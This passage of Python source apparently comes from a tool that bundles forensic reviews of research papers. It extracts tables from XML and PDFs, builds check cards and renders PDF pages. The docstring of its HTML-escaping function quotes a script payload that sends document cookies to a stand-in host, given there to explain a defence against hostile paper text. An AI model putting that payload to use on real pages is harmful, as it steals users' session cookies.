            slot["markers"] = cell["markers"]
        if cell.get("candidates"):
            slot["candidates"] = cell["candidates"]
        placed[f"{r},{c}"] = slot
    return {
        "n": len(cells),
        "n_unplaced": n_unplaced,
        "coverage": typed.get("coverage"),
        "kind_counts": typed.get("kind_counts") or {},
        # The shape clusters, which is where a systematic parse failure becomes
        # one sentence instead of N silent cells.
        "unparsed": (typed.get("unparsed") or {}).get("clusters") or [],
        "n_unread_numeric": (typed.get("unparsed") or {}).get(
            "n_unread_numeric_shaped") or 0,
        "cells": placed,
    }


def _table_sections(full: dict) -> list[dict]:
    """Where a table's SECTION BANNERS are, and what denominator each carries.

    A composite table -- one that stacks several sub-tables under spanning
    banner rows -- renders in the viewer as a flat grid, and a banner row
    renders as its own text repeated across every column: visually
    indistinguishable from data, and read as data. MEASURED across 138 archived
    table extractions: 80 tables carry banner sections, 223 sections in all,
    over 6 papers. That is not an edge case.

    THE DENOMINATOR HALF IS AN HONEST NEGATIVE. Of those 223 sections, ZERO have
    a derived denominator, and `composite._derive_n` says why on 217 of them:
    "no column yielded a verified denominator". That is the CORRECT answer, not
    a defect -- the papers involved are animal experiments whose sections carry
    mean (SD) data, so there is no count column to sum and verify against
    printed percentages. The reason is carried through to the reader rather than
    rendered as a blank, because a section with no denominator and a section
    whose denominator we never tried to find look identical otherwise.

    BANNER ROWS ARE FOUND ON THE RENDERED GRID, NOT ON `cells`, and that was a
    real bug rather than a preference. I first took the row indices from
    `cells[].row` and asserted in this docstring that they could not drift from
    the grid. They drift by one: on 10.1007/s11064-023-03861-8 Table 1 the
    banner is `cells` row 4 and `data` row 3, and `cells` excludes the label
    column so the widths differ too. Executing the renderer against a real
    bundle showed the consequence -- the data row `['4 wk','6','8','8','22']`
    was about to be collapsed into a single `4 wk` cell, DELETING four numbers
    from the reader's view.

    Reading the grid the viewer actually draws makes the alignment true by
    construction instead of by assumption, which is the same lesson as pairing
    table columns by header rather than by position.
    """
    grid = full.get("data")
    if not isinstance(grid, list) or not grid:
        return []
    cells = full.get("cells")
    if not isinstance(cells, list) or not cells:
        return []
    try:
        from .composite import split_sections
    except Exception:  # noqa: BLE001
        return []

    def _is_banner_row(row) -> bool:
        """Every populated cell carries the same non-numeric text.

        Same rule as `composite._is_banner`, applied to the rendered row. Two
        cells minimum: a one-column table has no banners, and treating its
        label column as one would blank the table.
        """
        vals = {str(v).strip() for v in (row or []) if str(v or "").strip()}
        if len(vals) != 1 or len([v for v in (row or []) if str(v or "").strip()]) < 2:
            return False
        only = next(iter(vals))
        # A repeated missing-data marker is data that is missing, not a
        # heading. Kept in step with composite._is_banner deliberately: this
        # function draws the viewer's table while composite decides section
        # membership, and when they disagree the viewer redraws rows the
        # analysis never saw.
        # NOT GUARDED. Swallowing an import failure here would silently revert
        # this function to the behaviour it was just fixed out of -- drawing a
        # row of "NR" as a section heading -- and the viewer would look correct
        # while disagreeing with the analysis about which rows exist. An
        # intra-package import that fails is a broken install, not a table.
        from .composite import _is_missing_marker
        if _is_missing_marker(only):
            return False
        try:
            float(only.replace(",", "").rstrip("*†‡§¶"))
        except ValueError:
            return True
        return False

    banner_rows = [i for i, row in enumerate(grid) if _is_banner_row(row)]

    out = []
    for s in split_sections(cells):
        if not s.get("label"):
            continue
        out.append({
            "label": s["label"],
            "n": s.get("n"),
            "n_source": s.get("n_source"),
            "why_not": s.get("why_not"),
            "n_by_column": s.get("n_by_column") or {},
        })
    return [{"banner_rows": banner_rows, "sections": out}] if out else []


def _pdf_table_records(paper_dir: Path, st: dict) -> list[dict]:
    """The tables a PDF-only paper has, read with the SHARED walker.

    WHY THIS EXISTS. `_table_records` returned `[]` the moment `find_xml` came
    back empty, leaving `st` as `{"xml": False, "error": "", "n_tables": 0}` --
    and that function's own docstring names the defect: "The empty `error` is
    the tell: nothing FAILED, nothing was ever attempted." It documented that
    shape for a missing paper and shipped it for a missing XML.

    MEASURED on `10.1007--s00702-004-0248-2`: the bundle reported 0 tables while
    the value register built 64 groups from that paper's 2 tables and 32 cells.
    A reader was told the paper has no tables on the same page as findings drawn
    out of them.

    `prepass.paper_tables` is deliberately the walker rather than a fourth
    reader of our own. Its docstring is explicit that it is shared with
    `agent._checkable_coverage` because "two walks of the same tables would be
    two denominators, and this repo has already published one coverage figure
    computed against a different denominator from the one beside it". The
    bundle was the second walk.

    The records are thinner than the XML path's on purpose: no footnotes, no
    section banners, no paged fetch, because the PDF path has none of those to
    give, and manufacturing them would dress weaker evidence as the stronger
    kind. `source` names the extractor so the viewer can say which it was.
    """
    from . import prepass

    try:
        found = prepass.paper_tables(paper_dir, include_supplements=True)
    except Exception as exc:  # noqa: BLE001
        st["error"] = f"table extraction failed: {type(exc).__name__}: {exc}"
        return []

    # THE WALKER'S OWN PROBLEMS, CARRIED. "This PDF was never table-extracted"
    # and "this paper has no tables" are opposite facts, and the reason
    # `paper_tables` rides a `problems` list at all is so that difference
    # survives the trip to a reader.
    probs = [w for w in (getattr(found, "problems", None) or []) if isinstance(w, str)]
    st["warnings"].extend(probs)
    st["n_tables"] = len(found)
    # AND NOT INTO `error`. `error` in this payload means OUR ATTEMPT FAILED --
    # a publisher file we could not parse. "This PDF has not been
    # table-extracted yet" is a state where no attempt was made, and
    # `test_a_paper_with_no_publisher_file_carries_no_error` exists to keep
    # those apart: "No XML is not a broken XML, and saying `error` there would
    # be the same defect pointed the other way." The viewer renders warnings in
    # the same place ("The table extraction warned:"), so the state is just as
    # visible without borrowing a word that means something stronger.

    out: list[dict] = []
    for tab in found:
        cells = [c for c in (tab.get("cells") or []) if isinstance(c, dict)]
        if not cells:
            continue
        # Columns in order of first appearance. `col` is absent from real PDF
        # extractions -- measured, 0 of 20 cells carried one on the paper above
        # -- so the header label is the only column identity there is.
        cols: list[str] = []
        for c in cells:
            cl = str(c.get("col_label") or "")
            if cl not in cols:
                cols.append(cl)
        # Grid indexed BY THE CELL'S OWN ROW NUMBER, so `_processed_cells` can
        # place its overlay at `int(row)` without a second numbering scheme to
        # drift from this one. Rows the extractor folded into the column labels
        # stay blank rather than being back-filled with a guess.
        n_rows = max((int(c.get("row") or 0) for c in cells), default=0) + 1
        headers = [""] + cols
        grid: list[list] = [[""] * len(headers) for _ in range(n_rows)]
        for c in cells:
            try:
                r = int(c.get("row") or 0)
                ci = cols.index(str(c.get("col_label") or "")) + 1
            except (TypeError, ValueError):
                continue
            if 0 <= r < n_rows:
                grid[r][0] = str(c.get("row_label") or "")
                grid[r][ci] = str(c.get("raw") or "")
        for i, h in enumerate(headers):
            grid[0][i] = h
        out.append({
            "sections": [],
            "processed": _processed_cells({"cells": cells, "headers": headers}, grid),
            "label": str(tab.get("label") or f"Table {len(out) + 1}"),
            "caption": "",
            "n_rows": n_rows,
            "width": len(headers),
            "n_footnotes": 0,
            "footnotes": [],
            "rows": grid,
            "image_only": False,
            "warnings": [],
            # WHICH EXTRACTOR, on the record itself. "3 tables" from publisher
            # XML and "3 tables" from a PDF are not the same evidence, and the
            # reader is the one who has to weigh that.
            "source": str(tab.get("extractor") or "pdf"),
        })
    return out


def _table_records(paper_dir: Path, status: dict | None = None) -> list[dict]:
    """The extracted tables, trimmed to what a strip card can show.

    The figure strip asks "did this survive extraction". That is the same
    question for a table, and a table that lost a column is the more
    consequential loss -- but the strip only ever showed figures, so on a paper
    with no figures the pane said "nothing was seen" while three correctly
    extracted grids sat unmentioned.

    `status`, if given, is FILLED with what the extractor said about the pass as
    a whole: `error`, `warnings`, `n_tables`, and `xml` (whether a publisher
    file was found at all). It is an out-parameter because the list return is
    what the source pane and its tests consume; the alternative was parsing the
    XML a second time purely to ask how the first parse went.

    WHY THIS MATTERS: `extract_xml_text_with_tables` RETURNS rather than raises
    on a malformed publisher file -- deliberately, so a bad XML cannot burn a
    billed stage -- and its return carries `error` with an empty `tables` list.
    That travelled through here as a plain empty list, so a publisher file that
    would not parse was indistinguishable in the viewer from a paper that has
    no tables, and the pane blamed the paper for our failed parse.
    """
    from .extraction.jats import extract_xml_text_with_tables, find_xml

    st = status if status is not None else {}
    st.update({"xml": False, "error": "", "warnings": [], "n_tables": 0})
    try:
        xml = find_xml(paper_dir)
        if xml is None:
            # NOT AN EMPTY LIST. A paper with no publisher XML still has
            # tables, and the shared walker is the one that finds them.
            # See `_pdf_table_records`.
            return _pdf_table_records(paper_dir, st)
        st["xml"] = True
        index = extract_xml_text_with_tables(str(xml))
    except Exception as exc:
        # A raise here is our bug or a missing file, not a table count of zero.
        st["error"] = f"table extraction failed: {exc}"
        return []

    # Carried on the SUCCESS path too: an index can parse and still report a
    # problem, and those are exactly the runs where the table list is short for
    # a reason that has nothing to do with the paper.
    st["error"] = str(index.get("error") or "")
    st["warnings"] = [w for w in (index.get("warnings") or []) if isinstance(w, str)]
    st["n_tables"] = index.get("n_tables") or len(index.get("tables") or [])

    out: list[dict] = []
    for entry in index.get("tables") or []:
        if not isinstance(entry, dict):
            continue
        num = entry.get("table_num")
        try:
            full = _paged_table(str(xml), int(num))
        except Exception as exc:
            # A table the index knows about and the fetch cannot return is a
            # HOLE, not an absence: the strip would silently show fewer cards
            # than the paper has tables and nothing would say so.
            st["warnings"].append(f"table {num} indexed but could not be read: {exc}")
            continue
        if full.get("cells_short"):
            # OUR SHORTFALL, SAID OUT LOUD. Anything derived from `cells` --
            # the section list, and any processed view built later -- describes
            # only the rows we hold.
            st["warnings"].append(
                f"table {num}: paged {len(full.get('cells') or [])} of "
                f"{full.get('cells_total')} cells; the section list for this "
                "table is partial")
        grid = [list(row) for row in (full.get("data") or [])]
        out.append({
            "sections": _table_sections(full),
            # WHAT THE TOOLKIT MADE OF EACH CELL, laid over the same grid.
            #
            # Greg, 2026-08-12: "the user should be able to read the original
            # and processed versions of whatever table the model had access to;
            # this would reveal any gross parsing errors."
            #
            # The ORIGINAL half already shipped -- `rows` is every raw cell. The
            # processed half did not exist anywhere: `check_table` computes
            # `parse_cells(cells)` and returns only summary counts, so the typed
            # cells never reached the tool result, the ledger or disk. Across a
            # whole rendered bundle there was not one `kind` string.
            #
            # This is the surface that makes a parse failure legible AS OURS. A
            # table where every cell types `non_numeric` currently looks
            # identical to a table with nothing checkable in it -- the oldest bug
            # in this repo -- and one glance at the two grids side by side ends
            # that. It is re-derived here rather than persisted upstream because
            # `paper_tables` + `parse_cells` are deterministic from the XML that
            # already ships in `paper/`, so nothing new has to be kept in sync.
            "processed": _processed_cells(full, grid),
            "label": entry.get("label") or f"Table {num}",
            "caption": entry.get("caption") or "",
            "n_rows": entry.get("n_rows"),
            "width": entry.get("width"),
            "n_footnotes": entry.get("n_footnotes"),
            # THE FOOTNOTES THEMSELVES, not a count of them.
            #
            # Greg, 2026-08-10: "many of the cells have annotations like
            # asterisks". They do, and until now the viewer counted the note
            # that defines them and then threw it away. MEASURED on
            # 10.1038/s41537-025-00576-3: Table 2 prints `180.74**` and its one
            # footnote reads "*P < 0.01; **P < 0.001."; Table 3's reads "OR odds
            # ratio, CI confidence interval." A reader was shown "1 footnote"
            # and no way to find out what the asterisks meant -- and the cell is
            # unreadable without it. The extractor had it the whole time.
            "footnotes": [f for f in (full.get("footnotes") or [])
                          if isinstance(f, dict) and (f.get("text") or "").strip()],
            # THE WHOLE TABLE, not a 14x10 corner of it.
            #
            # The card used to ship `grid[:14]` with each row cut to 10 columns
            # and each cell to 40 characters, and said "trimmed for this card".
            # On a real paper that hid most of the evidence: 10.1038/
            # s41537-025-00576-3 Table 2 is 73 rows, so the card showed 19% of
            # it, and the hidden part is where the section structure lives.
            # A viewer whose job is to let a reader check a finding against the
            # source cannot be the thing that withholds the source.
            #
            # MEASURED before doing it, because "ship everything" deserves a
            # number: full grids cost +8 KB across six papers against bundles of
            # 660 KB to 1.4 MB. The trimming was never buying anything.
            "rows": grid,
            # A table can exist and still have no cells: some publishers ship
            # one as a PICTURE. Found on `10.1186--s40352-024-00261-0`, whose
            # Table 2 is an image. Rendering that as an empty grid is the worst
            # available answer -- it looks like an extraction that returned
            # nothing rather than a table no check could ever reach.
            "image_only": bool(entry.get("image_only")),
            "warnings": [w for w in (full.get("warnings") or []) if isinstance(w, str)],
        })
    return out


def _table_provenance(paper_dir: Path, review_dir: Path) -> tuple[int, str]:
    """How many tables this review could see, and which extractor found them.

    Which extractor matters to a reader: the XML path returns a real cell grid
    with headers and footnotes, the PDF path returns whatever pdfplumber could
    rule and often nothing. "3 tables" from those two sources are not the same
    evidence.
    """
    from .extraction.jats import extract_xml_text_with_tables, find_xml

    try:
        xml = find_xml(paper_dir)
        if xml:
            result = extract_xml_text_with_tables(xml)
            n = int(result.get("n_tables") or 0)
            if n:
                return n, "publisher XML, as cell grids with headers and footnotes"
    except Exception:
        pass

    for d in (review_dir, paper_dir):
        data = _load(d / "tables.json")
        rows = data.get("tables") if isinstance(data, dict) else data
        if isinstance(rows, list) and rows:
            return len(rows), "PDF, by ruled lines"
    return 0, ""


def _figures_human_verified(review_dir: Path, paper_dir: Path) -> bool:
    """Did a person confirm the figure extraction, or was it merely not contradicted?

    `load_annotations` draws exactly this distinction and refuses to treat
    untouched as confirmed; here we only need to know whether an annotations
    file exists at all.
    """
    for d in (review_dir, paper_dir, review_dir / "figures", paper_dir / "figures"):
        if (d / "annotations.json").exists():
            return True
    return False


def _bundle_files(review_dir: Path, paper_dir: Path, pdfs: list[Path]) -> list[dict]:
    """The files that will actually be in the bundle, with a line on each.

    Existence-checked rather than hardcoded. The old list named `body.md`
    unconditionally, and no XML-fetched paper has one -- so the link 404'd on
    exactly the kind of paper the reader is most likely to be looking at.
    """
    out: list[dict] = []

    def add(rel: str, src: Path, what: str) -> None:
        if src.exists():
            out.append({"path": rel, "what": what})

    for pdf in pdfs:
        add(f"paper/{pdf.name}", pdf, "The paper as published.")
    for pattern in _PAPER_GLOBS:
        for src in sorted(paper_dir.glob(pattern)):
            what = ("Publisher XML. Tables are read from here, not from the PDF."
                    if src.suffix.lower() == ".xml"
                    else _FILE_BLURBS.get(src.name, "Supporting file."))
            add(f"paper/{src.name}", src, what)
    for name in _PAPER_FILES:
        add(f"paper/{name}", paper_dir / name,
            _FILE_BLURBS.get(name, "Supporting file."))
    for name in _ANALYSIS_FILES:
        add(f"analysis/{name}", review_dir / name,
            _FILE_BLURBS.get(name, "Analysis output."))
    return out


def _tool_cards(coverage: dict, calls: list[dict], findings: list[dict],
                report_obj: dict) -> dict:
    """The integrity card for every check this run NAMES.

    WHY THE VIEWER NEEDS THIS. The document's most consequential word is
    `impossible`, and until now nothing in the viewer said what KIND of claim
    that is. `registry.TOOL_INTEGRITY` has carried a hand-authored card for all
    49 tools -- purpose, evidence class, the strongest verdict the tool may
    reach, and the assumptions under which its verdict holds -- and no viewer
    surface read it. `report_render._render_check_glossary` renders the same
    cards into `report.md`, but it was written on 2026-08-10 and every archived
    run predates it, so on disk that glossary exists in zero reports. Building
    it here, at BUNDLE time, means an archived run gets the cards too: the join
    is over names the run already recorded, not over anything the run had to
    emit.

    JOINED ON EVERY NAME THE DOCUMENT SHOWS, not just `tools_run`. The report's
    own glossary joins on `coverage_summary.tools_run` alone, which is right for
    a section that lists what ran; it is not enough here, because the viewer
    stamps an evidence class beside individual findings and a finding's
    `technique` or `inputs.tool` can name a check that `tools_run` omits. A
    stamp that silently vanished on those findings would be worse than none:
    the reader would learn to read its absence as "unclassified" when it only
    means the join missed.

    A FINDING'S `technique` IS A FAMILY, NOT A TOOL. The model writes
    `technique: "grim"` for a `grim_percentage` call and `"duplication"` for
    `detect_duplication`, so a naive lookup finds no card for exactly the
    findings a reader most wants classified. `severity_reconcile._candidate_tools`
    already owns that mapping and its neighbour module says in as many words
    that a second copy would drift, so it is reused rather than restated. The
    resolved pairs ship as `aliases` so the viewer can look up either spelling.

    `tools_run` entries are not always bare names -- one archived run records
    `"grim_check (errored: string-typed decimals, rerouted to
    r_grim_ground_truth)"`. The text before the parenthesis is tried as a last
    fallback, and only when THAT resolves in the registry; a name that resolves
    no way at all is reported in `undescribed` rather than dropped, so a check
    we cannot describe shows up as a hole instead of making the glossary look
    complete.

    `manual` is the one name excluded from `undescribed`. It is not an
    undocumented tool, it is the ABSENCE of one -- the model read the number off
    the paper -- and the codebook already carries a row saying exactly that and
    calling it the weakest evidence class here. Listing it as something we
    cannot describe would report the system's most candid admission as a
    documentation gap.
    """
    try:
        from . import registry as _R
        from .severity_reconcile import _candidate_tools
    except Exception:                                       # pragma: no cover
        return {"cards": [], "undescribed": [], "aliases": {}}

    named: list[str] = []

    def add(value: Any) -> None:
        text = str(value or "").strip()
        if text and text not in named:
            named.append(text)

    for tool in (coverage or {}).get("tools_run") or []:
        add(tool)
    for tool in ((report_obj or {}).get("coverage_summary") or {}).get("tools_run") or []:
        add(tool)
    for call in calls or []:
        # VALIDATED CALLS ONLY. The ledger also carries `Read` and the harness's
        # own `StructuredOutput`, which are not forensic checks and have no
        # card by design. Harvesting them put "Read" in the list of "checks this
        # glossary cannot describe", which reports a file read as a
        # documentation gap and makes the real gaps harder to see.
        if call.get("validated") is False or call.get("surface") == "UNVALIDATED":
            continue
        add(call.get("tool"))
    for finding in findings or []:
        add(finding.get("technique"))
        inputs = finding.get("inputs")
        if isinstance(inputs, dict):
            add(inputs.get("tool"))

    def resolve(name: str) -> str | None:
        if name in _R.BY_NAME:
            return name
        for candidate in _candidate_tools(name):
            if candidate in _R.BY_NAME:
                return candidate
        stem = name.split(" (")[0].strip()
        return stem if stem in _R.BY_NAME else None

    cards: list[dict] = []
    aliases: dict[str, str] = {}
    undescribed: list[str] = []
    seen: set[str] = set()
    for name in named:
        key = resolve(name)
        if key is None:
            if name != "manual" and name not in undescribed:
                undescribed.append(name)
            continue
        if key != name:
            aliases[name] = key
        if key in seen:
            continue
        seen.add(key)
        cards.append(_R.BY_NAME[key].integrity_card())
    cards.sort(key=lambda c: str(c.get("tool") or ""))
    return {"cards": cards, "undescribed": sorted(undescribed), "aliases": aliases}


def _supplement_retrieval(paper_dir: Path) -> dict:
    """Did anyone PUBLISH a supplement, or did OUR download fail?

    Two opposite facts wore the same words. A paper whose supplement no
    provider lists and a paper whose supplement EuropePMC lists and our fetch
    404'd both came out as "not supplied to this review", and the second one
    reads as a gap in the publication when it is a gap in our retrieval.
    Measured over the 19 paper directories in this repo that carry a
    `*_supplementary_info.json`: 8 obtained, 7 our own failed download, 4
    genuinely nothing published -- so the distinction is not a corner case, it
    is the majority of the non-obtained runs.

    Read from the file the fetcher already wrote next to the paper, so this
    reaches no network and works on an archived run.
    """
    try:
        from .supplements import retrieval_record, retrieval_sentence
        record = retrieval_record(paper_dir)
        return {**record, "sentence": retrieval_sentence(record)}
    except Exception:                                       # pragma: no cover
        return {}


def _sourceable_tools() -> frozenset[str]:
    """Tools that accept `source_quote`, read from the registry.

    A call the argument was never offered to must not be rendered as one that
    declined to say where its numbers came from: extractors have no reported
    value to source, and marking them unsourced would turn a design decision
    into a coverage failure on every run.
    """
    try:
        from . import registry as _registry
    except Exception:  # noqa: BLE001
        return frozenset()
    return frozenset(s.name for s in _registry.SPECS
                     if any(p.name == "source_quote" for p in s.params))


@functools.lru_cache(maxsize=None)
def _integrity_card(tool: str) -> dict | None:
    """The registry's card for one tool, or None if it has none.

    None is a real answer and not a lookup failure: `Read` and the harness's
    `StructuredOutput` appear in every ledger, are not forensic checks, and have
    no card by design. The vignette says so in as many words rather than
    rendering an empty "what we asked".

    Cached because `integrity_card()` walks the spec's parameters on every call
    and a run's ledger repeats the same dozen tool names 40-odd times -- 2,106
    archived calls naming 51 distinct tools, against a registry of 54 specs.
    """
    try:
        from . import registry as _registry
        spec = _registry.BY_NAME.get(tool)
    except Exception:                                       # pragma: no cover
        return None
    return spec.integrity_card() if spec is not None else None


def _distil_calls(calls: list | None, stage: str) -> list[dict]:
    """Reduce a tool-call log to what a reader needs, with results clipped.

    Carries the SOURCING up to the top level. `source_quote` sits inside `input`
    and renders as one more line of a JSON dump; the verdict on it
    (`source_quote_verified` -- decided by `quotes.verify_ledger` against the
    paper, never by the model) sits on the ledger entry and was dropped here
    entirely. Between them they answer "where did this number come from", which
    is the question a reader auditing a finding actually has.
    """
    sourceable = _sourceable_tools()
    out: list[dict] = []
    for c in calls or []:
        if not isinstance(c, dict):
            continue
        result = c.get("result")
        if not isinstance(result, str):
            result = json.dumps(result, default=str) if result is not None else ""
        clipped = len(result) > _RESULT_CLIP
        sev = None
        as_reported = None
        power = None
        parsed = None
        try:
            parsed = json.loads(result) if result.strip().startswith("{") else None
            if isinstance(parsed, dict):
                sev = parsed.get("severity")
                # LIFTED IN PYTHON, not dug out of a JSON string by the page.
                # `as_reported` is the arithmetic that FAILED as printed on a
                # check whose verdict was then de-escalated by a reporting
                # convention. Left inside the raw result it is technically
                # present and effectively invisible -- which is the state Greg
                # objected to: "the reader can see the apparent violation (i.e.
                # our toolkit working) but then judge for themselves whether the
                # truncation etc is credible."
                if isinstance(parsed.get("as_reported"), dict):
                    as_reported = parsed["as_reported"]
                if isinstance(parsed.get("discriminating_power"), dict):
                    power = parsed["discriminating_power"]
        except Exception:
            parsed = None
        inp = c.get("input") or {}
        short = c.get("tool_short") or c.get("tool") or "?"
        entry = {
            "stage": stage,
            "seq": c.get("seq"),
            "tool": short,
            "surface": c.get("surface"),
            "validated": c.get("validated"),
            "severity": sev,
            "sourceable": short in sourceable,
            # LIFTED, because a crash is the one result a reader must not read
            # as a quiet pass. It sat on the ledger entry and was dropped here,
            # so an errored call arrived at the viewer indistinguishable from a
            # call that ran and found nothing.
            "is_error": bool(c.get("is_error")),
            "input": inp,
            "result": result[:_RESULT_CLIP] + ("\n... [clipped]" if clipped else ""),
        }
        if as_reported:
            entry["as_reported"] = as_reported
        if power:
            entry["discriminating_power"] = power
        quote = inp.get("source_quote") if isinstance(inp, dict) else None
        if isinstance(quote, str) and quote.strip():
            entry["source_quote"] = " ".join(quote.split())
            if inp.get("source_locator"):
                entry["source_locator"] = str(inp["source_locator"])
            # From the ENTRY, not the input: a verdict inside `input` would be
            # the model's own, and the party being checked cannot certify itself.
            for key in ("source_quote_verified", "source_quote_source"):
                if c.get(key):
                    entry[key] = str(c[key])
        # THE FIVE-PART VIGNETTE, composed here because the FULL result is here.
        # `entry["result"]` is clipped to 2,000 characters and a `check_table`
        # result runs past 30 kB, so composing downstream would read a truncated
        # copy and quietly describe the first fifth of the check.
        entry["vignette"] = _vignette.compose(entry, parsed, _integrity_card(short))
        out.append(entry)
    return out


#: A `<` that begins an HTML tag: followed by a letter, a slash, `!`, or `?`.
#: A bare `<` used as "less than" is not matched, so "p < 0.05" and "a < b"
#: survive as prose, and a blockquote `>` is never touched (so markdown
#: blockquotes still render).
_HTML_TAG_OPEN = re.compile(r"<(?=[a-zA-Z/!?])")


def _neutralise_html(md: str) -> str:
    """Escape tag-openers before markdown sees them.

    THE MARKDOWN LIBRARY PASSES RAW HTML THROUGH UNTOUCHED. Both things it
    renders here are attacker-influenced: `report.md` is written by the model
    from the paper's text, and `body_html` IS the paper's text. A hostile paper
    author who knows their work will be run through this tool can plant
    `<script>fetch('//evil/'+document.cookie)</script>` or
    `<img src=x onerror=...>` in their abstract; the model quotes it into the
    report; the viewer renders it into the DOM as live JavaScript when the
    reviewer -- or the accused author the bundle is forwarded to -- opens it.
    Reproduced: `_report_html("<script>alert(1)</script>")` returned that script
    verbatim and live.

    Neutralising the tag-opener rather than escaping everything keeps the whole
    of markdown working -- headers, tables, bold, lists, and blockquotes, which
    depend on `>` and are left alone.
    """
    return _HTML_TAG_OPEN.sub("&lt;", md or "")


def _report_html(report_md: str) -> str:
    """Pre-render the report to HTML in Python.

    Done here rather than with a JS markdown library because the viewer must be
    self-contained -- no CDN -- and the project already has a tested
    markdown->HTML path used for the PDF.
    """
    try:
        import markdown as _md
        return _md.markdown(_neutralise_html(report_md),
                            extensions=["tables", "fenced_code", "sane_lists"])
    except Exception:
        return f"<pre>{html.escape(report_md or '')}</pre>"



# ---------------------------------------------------------------------------
# Anchoring findings to the paper
#
# Done at BUILD time in Python, not at runtime in JS, because the browser's
# built-in PDF viewer exposes almost no API: you can jump to a page with
# `#page=N` and that is essentially all. It reports no click position and no
# text coordinates. Locating the text here and storing a page number is what
# makes "show me this in the paper" possible at all without bundling pdf.js.
#
# Two strategies, because one is not enough. Prose quotes are found verbatim in
# the PDF text layer; TABLE quotes are markdown reconstructions of a row and
# never match verbatim, so those are located by scoring pages on the numeric
# tokens they share with the quote. Measured on one paper: exact matching alone
# found 5 of 36 findings, both together found 33.
# ---------------------------------------------------------------------------

# Shared with the workbench. Re-exported so existing `from bundle import
# _locate` tests and the viewer keep a single implementation.
from .locators import (  # noqa: E402, F401 -- re-exports, see above
    _NUMTOK,
    _WS,
    _locate,
    _norm,
    _pdf_pages,
    anchor_findings,
)



# ---------------------------------------------------------------------------
# Rendering the PDF ourselves
#
# The browser's built-in PDF viewer is a dead end for this: it reports no click
# position, exposes no text coordinates, and -- the reason the first attempt
# failed in practice -- IGNORES a `#page=N` change once the document is already
# loaded, so navigation worked on first load and silently stopped working
# afterwards.
#
# pdf.js would solve it at the cost of bundling ~1 MB of library into a
# self-contained file. Rendering here instead is cheaper and gives the same
# capability: PyMuPDF is already a dependency, page images load from `file://`
# via <img> (unlike fetch, which is blocked), and the text geometry is
# extracted once at build time rather than re-parsed in every browser.
#
# LINES, not spans. A page has ~1,100 spans and ~50 lines; line boxes are
# precise enough to click and highlight, and keep the coordinate payload in the
# tens of kilobytes instead of megabytes.
# ---------------------------------------------------------------------------

#: 100 dpi JPEG is legible at full width and keeps a 12-page paper near 2.4 MB
#: of page images. They are separate files, so they cost nothing until viewed.
_PAGE_DPI = 100
_JPEG_QUALITY = 72


#: Every PDF in the package is rendered, not just the paper -- a supplement is
#: routinely where the checked numbers live. But page images are the bulk of a
#: bundle (a 14-page paper is about 6 MB), so the total is bounded and the
#: overflow is REPORTED rather than silently dropped.
_MAX_RENDERED_PAGES = 300


def render_pdf_pages(pdf: Path | None, out_dir: Path, doc: int = 0,
                     max_pages: int | None = None) -> list[dict]:
    """Write page images into the bundle and return their text geometry.

    `doc` namespaces the output directory and every returned page, because the
    viewer previously rendered `pdfs[0]` alone and addressed pages by a flat
    `pg{n}` -- so a second document's page 1 would have collided with the
    paper's.
    """
    if not pdf or not pdf.exists():
        return []
    try:
        import fitz
    except Exception:
        return []

    pages_dir = out_dir / "pages" / (str(doc) if doc else "")
    pages_dir.mkdir(parents=True, exist_ok=True)
    prefix = f"pages/{doc}/" if doc else "pages/"
    out: list[dict] = []
    try:
        with fitz.open(pdf) as doc_obj:
            n = doc_obj.page_count
            if max_pages is not None:
                n = min(n, max(0, max_pages))
            for i in range(n):
                # ONE BAD PAGE MUST NOT COST THE OTHER THIRTY-NINE.
                # `get_pixmap` raises on a damaged image stream or a broken
                # colour profile, and the whole loop was inside a single
                # `except Exception: return []`, so a single unrenderable page
                # discarded every page already written.
                try:
                    page = doc_obj[i]
                    pm = page.get_pixmap(dpi=_PAGE_DPI)
                    name = f"p{i + 1:03d}.jpg"
                    (pages_dir / name).write_bytes(
                        pm.tobytes("jpeg", jpg_quality=_JPEG_QUALITY))
                except Exception:
                    continue

                # Geometry is reported in PDF points; the image is rendered at
                # _PAGE_DPI. Store the POINT box and the point-space page size so
                # the viewer can scale to whatever width it renders at.
                rect = page.rect
                lines = []
                for block in page.get_text("dict").get("blocks", []):
                    for line in block.get("lines", []):
                        text = "".join(s.get("text", "") for s in line.get("spans", []))
                        if not text.strip():
                            continue
                        x0, y0, x1, y1 = line["bbox"]
                        lines.append({
                            "t": text,
                            "x": round(x0, 1), "y": round(y0, 1),
                            "w": round(x1 - x0, 1), "h": round(y1 - y0, 1),
                        })
                out.append({
                    "doc": doc,
                    "page": i + 1, "img": f"{prefix}{name}",
                    "pw": round(rect.width, 1), "ph": round(rect.height, 1),
                    "lines": lines,
                })
    except Exception:
        # Return what was rendered rather than throwing it away. An empty list
        # here is indistinguishable to the caller from a budget of zero.
        return out
    return out


def _ordered_pdfs(paper_dir: Path) -> list[Path]:
    """Every PDF in the package, the paper first.

    The paper is the one whose stem matches the directory -- that is how the
    fetch layer names it. Sorting alphabetically instead would put
    `10.1002--mpr.70006_supplementary.pdf` before the paper on some names and
    after it on others, and the FIRST document is the one findings anchor to.
    """
    pdfs = sorted(paper_dir.glob("*.pdf"))
    stem = paper_dir.name
    main = [p for p in pdfs if p.stem == stem]
    return main + [p for p in pdfs if p not in main]


def render_all_pdfs(pdfs: list[Path], out_dir: Path) -> tuple[list[dict], list[dict]]:
    """Render every PDF in the package. Returns `(pages, documents)`.

    The paper comes first; supplements, preregistration documents and anything
    else follow in name order. Only the first was ever rendered, so a reader
    could not see the supplement a finding rested on even when the bundle
    carried the file.
    """
    pages: list[dict] = []
    docs: list[dict] = []
    budget = _MAX_RENDERED_PAGES
    for i, pdf in enumerate(pdfs):
        # A document past the budget still gets a RECORD, with zero pages and
        # `truncated` set. Breaking out of the loop instead would drop it from
        # the selector entirely, and a document the reader is never told about
        # is indistinguishable from one the package does not contain.
        allowed = max(0, budget)
        got = render_pdf_pages(pdf, out_dir, doc=i, max_pages=allowed)
        budget -= len(got)
        try:
            import fitz
            with fitz.open(pdf) as d:
                total = d.page_count
        except Exception:
            total = len(got)
        # TRUNCATED AND FAILED ARE DIFFERENT FACTS, and the caller can tell
        # them apart without any new plumbing: it knows how many pages it
        # ASKED for. Anything short of that was not left out to fit a budget,
        # it could not be rendered. Before this, a document whose render
        # crashed came back `pages: 0, total_pages: 40, truncated: True` --
        # which reads as "we stopped early", the one thing it does not mean.
        expected = min(total, allowed) if allowed else 0
        failed = max(0, expected - len(got))
        record = {
            "id": i,
            "name": pdf.name,
            "label": ("paper" if i == 0 else "supplement") + f": {pdf.name}",
            "pages": len(got),
